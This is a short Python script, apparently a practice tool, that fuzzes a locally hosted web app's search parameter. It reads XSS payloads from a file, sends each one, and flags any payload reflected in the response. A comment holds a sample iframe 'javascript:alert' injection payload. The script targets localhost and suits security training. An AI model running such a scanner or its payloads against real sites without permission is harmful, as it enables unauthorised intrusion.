import requests
import time
import sys

site = "http://localhost:3000/#/search?q="
#http://localhost:3000/#/search?q=%3Ciframe%20src%3D%22javascript:alert(%60xss%60)%22%3E
try:
    r = requests.post(site)
    print(r)
    time.sleep(2)
    print("Site Responded Well")
except:
    print()
    time.sleep(1)
    print( "Site is not reachable")
    sys.exit(0)
   
try:
    payload = "otro.txt"
    resp = open(payload, 'r')
    print()
except FileNotFoundError:
    print("File is not Found")
    time.sleep(1)
    sys.exit(0)


    
f = open(payload, 'r')
l = 1
for line in f:
    #print()
    print( "Testing the payload " + str(l))
    if line in requests.post(site + line).text:
        print("XSS FOUND HERE!!!")
        print(requests.post(site + line).url)
    else:
        print("The Payload" + str(l) + "did not trigger XSS here" )
    l=l+1

site2 = "http://localhost:3000/#/search?q="
try:
    #data = '<iframe src="javascript:alert(`xss`)">'
    r = requests.post(site2)
    time.sleep(2)
    print("OK ")
except:
    print()
    time.sleep(1)
    print( "Site is not reachable")
    sys.exit(0)
   
try:
    payload = "otro.txt"
    resp = open(payload, 'r')
except FileNotFoundError:
    print("File is not Found")
    time.sleep(1)
    sys.exit(0)
print( "Testing...\n")
time.sleep(0)

f = open(payload, 'r')
l = 1
for line in f:
    print("Testing the payload " + line)
    if line in requests.get(site2 + line).text:
        print( "XSS FOUND HERE!!!")
        print(requests.get(site2 + line).url)
    else:
        print( "The Payload " + line + " did not trigger XSS here" )
        print(requests.get(site2 + line).text)
        l = 1

